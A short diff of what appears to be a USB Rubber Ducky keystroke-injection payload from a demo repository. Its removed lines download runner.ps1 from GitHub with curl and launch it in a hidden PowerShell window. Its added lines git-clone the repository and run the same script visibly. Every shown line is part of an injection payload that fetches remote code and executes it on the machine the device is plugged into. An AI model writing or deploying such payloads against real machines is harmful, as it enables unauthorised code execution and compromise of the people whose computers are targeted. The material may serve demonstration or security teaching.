@@ -10,8 +10,11 @@ ENTER
 
 DELAY 5000
 
-STRING curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/runner.ps1 -O .\runner.ps1
+STRING git clone https://github.com/lassemand/rubberducky_demo
 ENTER
 
-STRING Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList '-NoExit -Command .\runner.ps1'
+STRING cd rubberducky_demo
+ENTER
+
+STRING Start-Process -FilePath powershell.exe -ArgumentList '-NoExit -Command .\runner.ps1'
 ENTER
